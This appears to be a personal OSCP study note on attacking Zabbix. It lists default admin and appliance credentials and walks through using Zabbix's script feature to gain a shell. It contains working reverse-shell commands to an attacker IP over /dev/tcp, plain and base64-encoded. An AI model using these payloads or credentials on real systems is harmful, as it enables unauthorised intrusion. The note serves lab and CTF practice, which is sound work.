10050/10051


After chiseling to ATTACKER KALI

```
http://localhost:8888/zabbix
```

- **Username:** `Admin` (Note: Usernames are case-sensitive, and "A" must be capitalized)
- **Password:** `zabbix` 

For **Zabbix Appliances** accessing the console (command line), the credentials are: [[1](https://serverfault.com/questions/764694/what-is-the-default-root-password-for-zabbix-appliance-3-0)]

- **Username:** `appliance`
- **Password:** `zabbix`

---

## Zabbix Admin Dashboard Priv Esc

https://medium.com/@ducanhbui/n1ctf-2020-zabbix-fun-writeup-6f5b9ec24f64

_To proceed, we navigated to Alerts -> Scripts -> Create Script, and configured a simple reverse shell to connect back to our server._

![[Pasted image 20260607164339.png]]

_After configuring the reverse shell, we clicked Add to save the script._

![[Pasted image 20260607164350.png]]

_Next, we navigated to Monitoring -> Hosts, executed the script, and successfully gained access to the shell._

_We needed to update our script by base64 encoding the payload to ensure proper execution._

echo ‘bash -i >& /dev/tcp/192.168.45.154/443 0>&1’ | base64

echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE1NC80NDMgMD4mMQo= | base64 -d | /bin/bash

I did 

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `bash -c "bash -i >& /dev/tcp/${KaliIP}/4444 0>&1"`;

dv.paragraph("```bash\n" + command + "\n```");
```
and it worked without base64